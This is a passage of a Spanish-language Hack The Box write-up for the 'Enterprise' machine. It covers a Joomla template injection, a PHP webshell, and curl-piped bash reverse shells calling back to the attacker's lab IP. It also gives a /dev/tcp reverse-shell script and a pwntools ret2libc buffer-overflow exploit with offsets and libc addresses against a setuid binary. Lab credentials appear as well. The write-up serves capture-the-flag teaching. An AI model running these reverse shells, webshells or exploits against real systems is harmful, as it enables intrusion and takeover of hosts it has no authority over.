+<p>Hagamos tratamiento de la TTY para asi poder hacer <code>CTRL+C</code> sin miedo a perder la terminal, además de poder movernos entre comandos y tener historial :)</p>
+
+<ul>
+  <li><a href="https://www.youtube.com/watch?v=7L1WNU7fBec&amp;t=5004s"><strong>S4vitar</strong> explica en este video como obtener una Shell completamente interactiva (tratamiento TTY)</a>.</li>
+</ul>
+
+<p>Listooooos, a enumerar…</p>
+
+<p>…</p>
+
+<h3 id="reverse-shell-www-data-wordpress">Reverse Shell www-data WordPress</h3>
+
+<p>En el directorio <code>/var/www/html</code> tenemos los objetos de <strong>WordPress</strong>, validando el contenido del archivo <code>wp-config.php</code> (el que hace la conexión con la base de datos), obtenemos las credenciales del usuario <strong>root</strong>, pero de la base de datos, ya jugamos con la base de datos asi que no es interesante, pero las credenciales si lo son, guardémoslas por si algo :)</p>
+
+<pre><code class="language-php">...
+/** MySQL database username */
+define('DB_USER', 'root');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'NCC-1701E');
+...
+</code></pre>
+
+<p>Dando vueltas nos encontramos este archivo en el direcotorio <code>home/</code>:</p>
+
+<pre><code class="language-bash">www-data@b8319d86d21e:/home$ cat user.txt 
+As you take a look around at your surroundings you realise there is something wrong.
+This is not the Enterprise!
+As you try to interact with a console it dawns on you.
+Your in the Holodeck!
+</code></pre>
+
+<p>Básicamente que estamos en otro sitio y debemos movernos :(</p>
+
+<p>En la raíz del sistema tenemos el archivo <code>.dockerenv</code>, el cual nos avisa que probablemente estemos en un contenedor (el hostname que tenemos también nos da una pista sobre ello). Si vemos el objeto <code>/etc/hosts</code> lo confirmamos y nos damos cuenta de algo:</p>
+
+<pre><code class="language-bash">www-data@b8319d86d21e:/$ cat /etc/hosts
+127.0.0.1       localhost
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+172.17.0.2      mysql 15af95635b7d
+172.17.0.4      b8319d86d21e
+</code></pre>
+
+<p>Nosotros estamos en el host <code>b8319d86d21e</code> que resuelve a la <strong>IP</strong> <code>172.17.0.4</code>. Vemos también el host del servicio <strong>MySQL</strong>, pero hay una brecha, ya que falta la <code>172.17.0.3</code>. En este momento recordé el servicio <strong>Joomla</strong> y que tenemos credenciales para probar…</p>
+
+<p>…</p>
+
+<h4 id="joomla-login-done">Joomla login done</h4>
+
+<p>Vamos al apartado <code>administrator/</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080_administratorPANEL.png" alt="112page8080_administratorPANEL" /></p>
+
+<p>Y con las credenciales <strong>geordi.la.forge:ZD3YxfnSjezg67JZ</strong> logramos entrar al sitio como usuario <strong>Super Users</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page8080_administratorPANEL_dash.png" alt="112page8080_administratorPANEL_dash" /></p>
+
+<p>…</p>
+
+<h3 id="reverse-shell-www-data-joomla">Reverse Shell www-data Joomla</h3>
+
+<p>Listoneeeees, jugando con <a href="https://www.hackingarticles.in/joomla-reverse-shell/">este recurso</a> obtenemos ejecución remota de comandos, simplemente debemos modificar un template (modificaré el archivo <code>index.php</code> del template <strong>beez3</strong>) y dirigirnos a el para que el código sea ejecutado…</p>
+
+<p>Usamos el mismo payload de antes (<code>curl</code> a nuestro servidor) solo que ahora cambiamos el puerto por el cual obtendremos la Reverse Shell:</p>
+
+<pre><code class="language-php">...
+system("/usr/bin/curl http://10.10.14.17:8000/rev.sh | bash");
+...
+</code></pre>
+
+<p>Hacemos una peticion hacia la ruta: <code>http://10.10.10.61:8080/templates/beez3/index.php</code> y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_wwwdata_joomla_RevSH.png" alt="112bash_wwwdata_joomla_RevSH" /></p>
+
+<p>Bien. Estamos en otro host, el <code>a7018bfdc454</code>.</p>
+
+<p>…</p>
+
+<h2 id="movimiento-lateral-wwwdata-doc-host">Movimiento lateral : www-data (docker) -&gt; www-data (host) <a href="#movimiento-lateral-wwwdata-doc-host">#</a></h2>
+
+<p>Después de hacer tratamiento de la TTY, encontramos esta maravilla:</p>
+
+<pre><code class="language-bash">www-data@a7018bfdc454:/var/www/html$ ls -la
+total 16988
+drwxr-xr-x 18 www-data www-data    4096 Sep  8  2017 .
+drwxr-xr-x  4 root     root        4096 Jul 24  2017 ..
+...
+drwxrwxrwx  2 root     root        4096 Oct 17  2017 files
+...
+</code></pre>
+
+<pre><code class="language-bash">www-data@a7018bfdc454:/var/www/html/files$ ls -la
+total 12
+drwxrwxrwx  2 root     root     4096 Oct 17  2017 .
+drwxr-xr-x 18 www-data www-data 4096 Sep  8  2017 ..
+-rw-r--r--  1 root     root     1406 Oct 17  2017 lcars.zip
+www-data@a7018bfdc454:/var/www/html/files$
+</code></pre>
+
+<p>Si recordamos, ya habíamos visto este archivo en nuestra enumeración con el puerto <strong>443</strong> de la máquina, asi que probablemente sea un recurso compartido, para validar creemos un archivo sencillito:</p>
+
+<pre><code class="language-bash">www-data@a7018bfdc454:/var/www/html/files$ echo "hola" &gt; hola.txt
+www-data@a7018bfdc454:/var/www/html/files$ ls -la
+total 16
+drwxrwxrwx  2 root     root     4096 May  7 21:38 .
+drwxr-xr-x 18 www-data www-data 4096 Sep  8  2017 ..
+-rw-r--r--  1 www-data www-data    5 May  7 21:38 hola.txt
+-rw-r--r--  1 root     root     1406 Oct 17  2017 lcars.zip
+www-data@a7018bfdc454:/var/www/html/files$
+</code></pre>
+
+<p>Y en la web:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112page443_files_new_hola.png" alt="112page443_files_new_hola" /></p>
+
+<pre><code class="language-bash">❭ curl -s -k https://10.10.10.61/files/hola.txt
+hola
+</code></pre>
+
+<p>Perrrrrrfecto, asi que podemos crearnos un archivo <code>.php</code> con contenido malicioso para que sea interpretado por la web :) Y ver a donde nos lleva…</p>
+
+<pre><code class="language-bash">www-data@a7018bfdc454:/var/www/html/files$ echo '&lt;?php system("whoami; hostname"); ?&gt;' &gt; hola.php
+</code></pre>
+
+<pre><code class="language-bash">❭ curl -s -k https://10.10.10.61/files/hola.php
+www-data
+enterprise.htb
+</code></pre>
+
+<p>Al parecer ahora si estamos comunicándonos con el <strong>host</strong>, entablémonos una nueva Reverse Shell :)</p>
+
+<pre><code class="language-bash">www-data@a7018bfdc454:/var/www/html/files$ echo '&lt;?php system("curl http://10.10.14.17:8000/rev.sh | bash"); ?&gt;' &gt; hola.php
+</code></pre>
+
+<p>Cambiamos el puerto en el que vamos a estar escuchando:</p>
+
+<pre><code class="language-bash">❭ cat rev.sh 
+#!/bin/bash
+
+bash -i &gt;&amp; /dev/tcp/10.10.14.17/4435 0&gt;&amp;1
+</code></pre>
+
+<p>Nos ponemos en escucha: <code>nc -lvp 4435</code> y hacemos la petición hacia el recurso, obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_wwwdata_enterpriseHTB_RevSH.png" alt="112bash_wwwdata_enterpriseHTB_RevSH" /></p>
+
+<p>Tratamiento de la TTY y a enumerar.</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Con <strong>www-data</strong> tenemos acceso a la flag <code>user.txt</code> sobre la ruta <code>/home/jeanlucpicard</code>.</p>
+
+<p>Viendo los servicios corriendo internamente tenemos:</p>
+
+<pre><code class="language-bash">www-data@enterprise:/$ netstat -l
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State  
+tcp        0      0 0.0.0.0:hostmon         0.0.0.0:*               LISTEN 
+tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN 
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN 
+...
+</code></pre>
+
+<p>Los dos puertos que vimos externamente, <strong>22</strong> y <strong>32812</strong>. Pero también uno llamado <strong>hostmon</strong>, que jugando con el archivo <code>/proc/net/tcp</code> (y con internet), vemos que es el puerto <strong>5355</strong>. Dando vueltas con él no conseguimos nada, asi que recordamos el puerto <strong>32812</strong> que (no se vio, pero se hizo :P) externamente nos mostraba un programa interactivo, veámoslo pero internamente:</p>
+
+<pre><code class="language-bash">www-data@enterprise:/$ nc 127.0.0.1 32812
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+Enter Bridge Access Code: 
+hola
+
+Invalid Code
+Terminating Console
+
+www-data@enterprise:/$
+</code></pre>
+
+<p><strong>(Desde nuestra máquina atacante podemos ejecutar <code>nc 10.10.10.61 32812</code> y vamos a obtener el mismo output)</strong></p>
+
+<p>Vale, es un programa relacionado con el plugin que ya explotamos, <strong>lcars</strong> (Library Computer Access and Retrieval System), nos pide un código de acceso… Intentando con las contraseñas que encontramos no logramos entrar :(</p>
+
+<p>Se me dio la idea de buscar algo relacionado con <strong>lcars</strong> en la máquina, y sí, encontramos cositas:</p>
+
+<pre><code class="language-bash">www-data@enterprise:/$ find / -name lcars 2&gt;/dev/null
+/etc/xinetd.d/lcars
+/bin/lcars
+</code></pre>
+
+<p>Un binario llamativo, profundicemos en él:</p>
+
+<pre><code class="language-bash">www-data@enterprise:/$ ls -la /bin/lcars 
+-rwsr-xr-x 1 root root 12152 Sep  8  2017 /bin/lcars
+www-data@enterprise:/$ file /bin/lcars 
+/bin/lcars: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=88410652745b0a94421ce22ea4278a8eaea8db57, not stripped
+</code></pre>
+
+<pre><code class="language-bash">www-data@enterprise:/$ /bin/lcars 
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+Enter Bridge Access Code: 
+hola
+
+Invalid Code
+Terminating Console
+
+www-data@enterprise:/$ 
+</code></pre>
+
+<p>Tiene la misma ejecución, por lo tanto podemos pensar que el binario está siendo servido en el puerto <strong>32812</strong>, bien, juguemos con él…</p>
+
+<p>Con <a href="https://www.thegeekdiary.com/how-to-use-strace-and-ltrace-commands-in-linux/">strace y ltrace</a>, podemos ver los llamados que hace una aplicación hacia el sistema, nos damos cuenta de algo:</p>
+
+<pre><code class="language-bash">www-data@enterprise:/$ ltrace /bin/lcars 
+__libc_start_main(0x56555c91, 1, 0xffffdd04, 0x56555d30 &lt;unfinished ...&gt;
+setresuid(0, 0, 0, 0x56555ca8)                                                                                         = 0xffffffff
+puts(""
+)                                                                                                               = 1
+puts("                 _______ _______"...                 _______ _______  ______ _______
+)                                                                            = 49
+puts("          |      |       |_____|"...          |      |       |_____| |_____/ |______
+)                                                                            = 49
+puts("          |_____ |_____  |     |"...          |_____ |_____  |     | |    \_ ______|
+)                                                                            = 49
+puts(""
+)                                                                                                               = 1
+puts("Welcome to the Library Computer "...Welcome to the Library Computer Access and Retrieval System
+
+)                                                                            = 61
+puts("Enter Bridge Access Code: "Enter Bridge Access Code: 
+)                                                                                     = 27
+fflush(0xf7fc7d60)                                                                                                     = 0
+fgets(
+</code></pre>
+
+<p>Ahí espera por nuestro input, coloquemos <strong>hola</strong>:</p>
+
+<pre><code class="language-bash">fgets(hola
+"hola\n", 9, 0xf7fc75a0)                                                                                         = 0xffffdc47
+strcmp("hola\n", "picarda1")                                                                                           = -1
+puts("\nInvalid Code\nTerminating Consol"...
+Invalid Code
+Terminating Console
+
+)                                                                          = 35
+fflush(0xf7fc7d60)                                                                                                     = 0
+exit(0 &lt;no return ...&gt;
++++ exited (status 0) +++
+www-data@enterprise:/$
+</code></pre>
+
+<p>Opa, vemos la función <a href="https://www.cplusplus.com/reference/cstring/strcmp/">strcmp</a> (que compara dos valores, si son iguales continua el flujo del programa), toma <strong>hola</strong> y lo compara con el valor <strong>picarda1</strong>, como no son iguales obtenemos el error <strong>Invalid Code - Terminating Console</strong>. Asi que probemos ejecutar el programa pero pasándole como código <strong>picarda1</strong>:</p>
+
+<pre><code class="language-bash">www-data@enterprise:/$ /bin/lcars 
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+Enter Bridge Access Code: 
+picarda1
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    \_ ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+LCARS Bridge Secondary Controls -- Main Menu: 
+
+1. Navigation
+2. Ships Log
+3. Science
+4. Security
+5. StellaCartography
+6. Engineering
+7. Exit
+Waiting for input: 
+
+</code></pre>
+
+<p>Perfecto, entramos, ahora nos encontramos un menú, jugando sin explotar nada, no vemos nada e.e Si generamos una cadena de 300 caracteres y se la pasamos a cada opción, obtenemos un <a href="https://en.wikipedia.org/wiki/Segmentation_fault">Segmentation Fault</a> en <code>4. Security</code>:</p>
+
+<pre><code class="language-bash">❭ cyclic 300
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+</code></pre>
+
+<pre><code class="language-bash">...
+LCARS Bridge Secondary Controls -- Main Menu: 
+
+1. Navigation
+2. Ships Log
+3. Science
+4. Security
+5. StellaCartography
+6. Engineering
+7. Exit
+Waiting for input: 
+4
+Disable Security Force Fields
+Enter Security Override:
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
+Segmentation fault (core dumped)
+www-data@enterprise:/$ 
+</code></pre>
+
+<p>Ooo, asi que probablemente debamos explotar este <a href="https://www.welivesecurity.com/la-es/2014/11/05/como-funcionan-buffer-overflow/">buffer overflow</a> para ejecutar algún tipo de <strong>Shell code</strong> ante la máquina, ya profundizaremos en esto… Pasemos el binario a nuestro sistema atacante, asi es más fácil jugar.</p>
+
+<ul>
+  <li><a href="https://revista.seguridad.unam.mx/numero23/uno-de-los-cl-sicos-buffer-overflow">Explicación sobre que es un buffer overflow</a>.</li>
+</ul>
+
+<pre><code class="language-bash">www-data@enterprise:/bin$ python3 -m http.server 44444
+Serving HTTP on 0.0.0.0 port 44444 ...
+</code></pre>
+
+<pre><code class="language-bash">❭ wget http://10.10.10.61:44444/lcars
+--2021-05-07 22:29:05--  http://10.10.10.61:44444/lcars
+Conectando con 10.10.10.61:44444... conectado.
+...
+</code></pre>
+
+<p>Validamos integridad del binario:</p>
+
+<pre><code class="language-bash">www-data@enterprise:/bin$ md5sum lcars 
+cf72dd251d6fee25e638e9b8be1f8dd3  lcars
+</code></pre>
+
+<pre><code class="language-bash">❭ md5sum lcars
+cf72dd251d6fee25e638e9b8be1f8dd3  lcars
+</code></pre>
+
+<p>Listo, todo correcto, a divertirnos (:</p>
+
+<p>…</p>
+
+<h3 id="buffer-overflow">Buffer Overflow</h3>
+
+<p>Nos copiaremos la estructura de un programa que le vi a <a href="https://www.youtube.com/user/dplastico">dplastico</a> para jugar con <strong>gdb</strong>, con el recurso remoto y también para movernos localmente.</p>
+
+<p>Inicialmente le enviaremos todos los datos que recibe el programa:</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import sys
+from pwn import *
+
+elf = context.binary = ELF(sys.argv[1])
+context.terminal = ['tmux', 'splitw', '-h']
+
+def start():
+    if args.GDB:
+        return gdb.debug(sys.argv[1])
+    if args.REMOTE:
+        return remote('10.10.10.61', 32182)
+    else:
+        return process(sys.argv[1])
+
+r = start()
+# ======================= Aca ta la magia ========================
+
+r.sendlineafter("Enter Bridge Access Code:", "picarda1")
+r.sendlineafter("Waiting for input:", "4")
+print(r.recv())
+
+# ===================== Aca termina la magia ====================
+r.interactive()
+</code></pre>
+
+<p>Ejecutamos:</p>
+
+<pre><code class="language-bash">❭ python3 exploit.py ./lcars
+[*] '/htb/enterprise/scripts/lcars'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Starting local process './lcars': pid 898435
+b' \n'
+[*] Switching to interactive mode
+Disable Security Force Fields
+Enter Security Override:
+$
+</code></pre>
+
+<p>Bien, el programa esta esperando el input donde encontramos el <strong>Segmentation Fault</strong>, por lo tanto sera donde enviaremos nuestro payload:</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import sys
+from pwn import *
+
+elf = context.binary = ELF(sys.argv[1])
+context.terminal = ['tmux', 'splitw', '-h']
+
+def start():
+    if args.GDB:
+        return gdb.debug(sys.argv[1])
+    if args.REMOTE:
+        return remote('10.10.10.61', 32812)
+    else:
+        return process(sys.argv[1])
+
+r = start()
+# ======================= Aca ta la magia ========================
+
+payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac"
+
+r.sendlineafter("Enter Bridge Access Code:", "picarda1")
+r.sendlineafter("Waiting for input:", "4")
+r.sendlineafter("Enter Security Override:", payload)
+
+# ===================== Aca termina la magia ====================
+r.interactive()
+</code></pre>
+
+<ul>
+  <li><a href="https://tc.gts3.org/cs6265/2019/tut/tut03-02-pwntools.html">Writing exploits with <strong>pwntools</strong></a>.</li>
+</ul>
+
+<p><strong>(Ya hablaremos de las protecciones del binario)</strong></p>
+
+<p>Ejecutemos pero veamos el debug con <strong>gdb</strong> de una vez:</p>
+
+<pre><code class="language-bash">❭ python3 exploit.py ./lcars GDB
+[*] '/sec/htb/enterprise/scripts/lcars'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Starting local process '/usr/bin/gdbserver': pid 907075
+[*] running in new terminal: /usr/bin/gdb -q  "./lcars" -x /tmp/pwn4qa4544z.gdb
+</code></pre>
+
+<p>Y con <strong>tmux</strong> se nos abre otro panel en la misma ventana ejecutando <strong>gdb</strong>, escribimos <code>continue</code> (o <code>c</code>) y obtenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_gdb_segFault.png" alt="112bash_gdb_segFault" /></p>
+
+<p>Nos enfocaremos en el apartado <strong>REGISTERS</strong> y en uno de ellos por ahora:</p>
+
+<ul>
+  <li>Registro <code>eip</code>, encargado de mostrar la siguiente dirección a la que ira el programa.</li>
+</ul>
+
+<blockquote>
+  <p><a href="https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm">Información sobre los registros</a></p>
+</blockquote>
+
+<p>En nuestro caso 4 registros están siendo sobreescritos por parte de nuestro payload, la idea es extraer exactamente la posición del paylaod que contiene el registro <strong>eip</strong>, ya que si es el registro que indica a donde ir, teniendo control sobre él, podríamos poner cualquier dirección a la cual queramos que vaya, esto lo podemos hacer con el mismo <strong>cyclic</strong>:</p>
+
+<pre><code class="language-bash">...
+# *EIP  0x63616164 ('daac')
+...
+pwndbg&gt; cyclic -l daac
+212
+</code></pre>
+
+<p>En la posición 212 encuentra los caracteres <strong>daac</strong>, pues generemos <strong>212</strong> A’s <strong>4</strong> B’s y <strong>4</strong> C’s para mostrar mejor esto y enviémoslas ;)</p>
+
+<pre><code class="language-py">...
+payload = "A"*212·                                                                                                                                                                         payload += "B"*4 + "C"*4
+...
+</code></pre>
+
+<pre><code class="language-bash">...
+*EAX  0xfe
+*EBX  0x41414141 ('AAAA')
+ ECX  0x0
+ EDX  0x0
+*EDI  0xf7f20000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e4d6c */
+*ESI  0xf7f20000 (_GLOBAL_OFFSET_TABLE_) ◂— insb   byte ptr es:[edi], dx /* 0x1e4d6c */
+*EBP  0x41414141 ('AAAA')
+*ESP  0xffdffc70 ◂— 'CCCC'
+*EIP  0x42424242 ('BBBB')
+...
+</code></pre>
+
+<p>Bien, tenemos que el registro que apunta a la base de la pila (<a href="https://es.stackoverflow.com/questions/39686/en-que-se-usan-los-registros-ebp-edi-esi#answer-40119">ebp</a>, “este registro mantiene la dirección del origen de la pila”), contiene hasta la posición <strong>212</strong>, despues empezaría el registro <strong>eip</strong> (que es el que nos interesa), conteniendo las <strong>B</strong>’s, por lo tanto en esa posición debe ir la dirección a la que queremos ir… Y las <strong>C</strong> estarían haciendo parte del stack, que es donde iría nuestro shellcode.</p>
+
+<p>…</p>
+
+<p>También podemos entenderlo asi:</p>
+
+<p>(Enviamos 200 <strong>C</strong>’s y en <strong>gdb</strong> le indicamos que nos muestre 80 direcciones, pero que empiece a contar 50 antes de llegar al <strong>esp</strong> (esto para poder ver el contenido del <strong>ebp</strong> y el <strong>eip</strong>))</p>
+
+<ul>
+  <li><a href="https://www.ellaberintodefalken.com/2013/07/vulnerabilidades-shellcode-buffer-overflow.html">Buffer overflow y Shellcode</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112bash_gdb_content_esp_eip_ebp.png" alt="112bash_gdb_content_esp_eip_ebp" /></p>
+
+<p>:P</p>
+
+<p>…</p>
+
+<p>Echémosle un ojo a las protecciones que tiene el binario:</p>
+
+<blockquote>
+  <p>SPAM: <a href="https://lanzt.github.io/blog/ctf/CTF-PicoCTF2019-Overflow1">Acá tengo otro writeup de un reto en especifico sobre <strong>Buffer Overflow</strong></a>.</p>
+</blockquote>
+
+<pre><code class="language-bash">❭ checksec lcars
+[*] '/htb/enterprise/scripts/lcars'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+</code></pre>
+
+<ul>
+  <li><strong>RELRO</strong>: Al estar en <strong>Partial</strong> nos permite sobreescribir direcciones del <a href="https://en.wikipedia.org/wiki/Global_Offset_Table">global offset table</a>.</li>
+  <li><strong>Stack</strong>: Nos despreocupamos (ya que está desactivada :P) de una dirección que se crea antes de llegar al final del <code>Stack</code>, ya que puede darnos problemas.</li>
+  <li><strong>NX</strong>: El <strong>Stack</strong> es ejecutable, por lo tanto podríamos enviar <strong>shellcodes</strong> y código malicioso para ejecutarlo en el binario.</li>
+  <li><strong>PIE</strong>: Pero tenemos de manera randomizada la <a href="https://en.wikipedia.org/wiki/Virtual_address_space">Virtual Address Place</a> del binario.</li>
+</ul>
+
+<p>Bien, ahora lo que nos queda es jugar con la dirección del registro <strong>eip</strong> y ver como podemos ejecutar comandos jugando con el stack y las direcciones locas…</p>
+
+<p><strong>En este caso no podemos hacer el típico ataque BOF (de los CTF’s) de movernos a una función llamada **vuln</strong> o llamada <strong>flag</strong> para que nos muestre lo que queremos, nop, en este caso debemos buscar un poco más para ver como ejecutar comandos ya sea con expresiones externas o con el mismo programa…**</p>
+
+<p>Leyendo un poco encontré un ataque llamado <a href="https://www.hackplayers.com/2021/01/taller-de-exploiting-ret2libc-en-linux-x64.html">Ret2libc</a> que se basa en ejecutar código que ya existe en la memoria, mejor dicho, funciones del propio programa :)</p>
+
+<blockquote>
+  <p>Pa leer: <a href="https://ironhackers.es/tutoriales/introduccion-al-exploiting-parte-3-mi-primer-buffer-overflow-stack-5-protostar/">Mi primer buffer overflow</a>.</p>
+</blockquote>
+
+<p>Para ejecutar esto, debemos buscar si existe alguna función importante en memoria, encontramos este recurso que nos explica detalladamente lo peligrosas que pueden ser las funciones del propio programa/librería:</p>
+
+<ul>
+  <li><a href="https://medium.com/swlh/binary-exploitation-data-execution-prevention-cc47edf2033b#e300">Binary Exploitation Data-Execution-Prevention</a>.</li>
+</ul>
+
+<p>Nos indican que debemos buscar la función <code>system()</code>, que ejecuta comandos en el sistema:</p>
+
+<pre><code class="language-bash">pwndbg&gt; print system
+$1 = {int (const char *)} 0xf7d7ffa0 &lt;__libc_system&gt;
+</code></pre>
+
+<p>Bien, tenemos una dirección en memoria de la función <code>system()</code>. Ahora debemos encontrar alguna referencia hacia “<code>/bin/bash</code>” o “<code>/bin/sh</code>”, para asi obtener una <strong>Shell</strong> cuando ejecutemos nuestro exploit:</p>
+
+<pre><code class="language-bash">pwndbg&gt; find "/bin/bash"
+Argument required (expression to compute).
+</code></pre>
+
+<p>Siguiendo <a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Searching-Memory.html">esta descripción de <strong>find</strong></a>, debemos pasarle dos argumentos más para que haga la búsqueda de memoria correctamente:</p>
+
+<blockquote>
+  <p>find [/sn] start_addr, +len, val1 [, val2, …]</p>
+</blockquote>
+
+<p>Entonces podemos indicarle que la dirección de inicio sea la que encontramos (<code>system</code>) (asi solo no sirve, debemos agregarle <code>+len</code>) y le pasamos que el tamaño sea de <strong>8</strong> bytes:</p>
+
+<pre><code class="language-bash">pwndbg&gt; find 0xf7d7ffa0,+12345678,"/bin/bash"
+warning: Unable to access 16000 bytes of target memory at 0xf7f21f29, halting search.
+Pattern not found.
+</code></pre>
+
+<p>Parece que ya está funcionando, busquemos <code>/bin/sh</code>:</p>
+
+<pre><code class="language-bash">pwndbg&gt; find 0xf7d7ffa0,+12345678,"/bin/sh"
+0xf7ec733c
+warning: Unable to access 16000 bytes of target memory at 0xf7f210c4, halting search.
+1 pattern found.
+</code></pre>
+
+<p>Perfecto, encontramos una dirección en memoria donde se hace referencia a <code>/bin/sh</code>, también nos la guardamos :) Vemos que tenemos y vamos organizando el script:</p>
+
+<ul>
+  <li>Dirección función <strong>system()</strong>, que nos servirá para ejecutar la Shell (<code>/bin/sh</code>): <code>0xf7d7ffa0</code>.</li>
+  <li>Dirección llamado <code>/bin/sh</code>: <code>0xf7ec733c</code>.</li>
+</ul>
+
+<p>Para que las direcciones no sean dinámicas, debemos validar el <a href="https://es.wikipedia.org/wiki/Aleatoriedad_en_la_disposici%C3%B3n_del_espacio_de_direcciones">ASLR</a> que esté desactivado:</p>
+
+<p><strong>(Esto en mi máquina, pero también debemos validarlo en el sistema vulnerable.)</strong></p>
+
+<pre><code class="language-bash">❭ cat /proc/sys/kernel/randomize_va_space
+0
+</code></pre>
+
+<p>Si está en <strong>2</strong> está activado y deberíamos pasarlo a <strong>0</strong> (o bypassearlo), pero por ahora tamos bien, validemos ahora el de <strong>enterprise.htb</strong>:</p>
+
+<pre><code class="language-bash">www-data@enterprise:/var/www/html/files$ cat /proc/sys/kernel/randomize_va_space
+0
+</code></pre>
+
+<p>Listo, sin problemas.</p>
+
+<p>…</p>
+
+<p>Entonces nuestro script tendría estas nuevas líneas:</p>
+
+<pre><code class="language-py">...
+payload = ("A"*212).encode() # Pasamos la cadena a bytes para poder concatenarla
+payload += p32(0xf7d7ffa0, endian='little') # system()
+payload += p32(0xf7ec733c, endian='little') # /bin/sh
+...
+</code></pre>
+
+<p>Ahora podemos empezar a probar sin tener de intermediario a <strong>gdb</strong>:</p>
+
+<pre><code class="language-bash">❭ python3 exploit.py ./lcars
+[*] '/htb/enterprise/scripts/lcars'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+[+] Starting local process './lcars': pid 1125113
+[*] Switching to interactive mode
+
+sh: 1: \x13 not found
+[*] Got EOF while reading in interactive
+$ id
+[*] Process './lcars' stopped with exit code -11 (SIGSEGV) (pid 1125113)
+[*] Got EOF while sending in interactive
+</code></pre>
+
+<p>Tenemos un error: <strong>sh: 1: \x13 not found</strong>… Buscando más ejemplos sobre el ataque encontramos este recurso:</p>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&amp;-return-to-libc-chaining-tutorial.pdf">Linux Classic - return2libc.pdf</a>.</li>
+</ul>
+
+<p>Donde ejecuta prácticamente los mismos pasos, busca la dirección en memoria de la función <code>system()</code> y algo relacionado con “<code>/bin/sh</code>”, peeeero entre medio de los dos pasa <strong>4 bytes</strong> (8 bits) basura, algo asi como:</p>
+
+<pre><code class="language-py">...
+payload = ("A"*212).encode() # Pasamos la cadena a bytes para poder concatenarla
+payload += p32(0xf7d7ffa0, endian='little') # system()
+payload = ("B"*4).encode() # + Basurita en bytes
+payload += p32(0xf7ec733c, endian='little') # /bin/sh
+...
+</code></pre>
+
+<p>Entonces (leyendo artículos):</p>
+
+<blockquote>
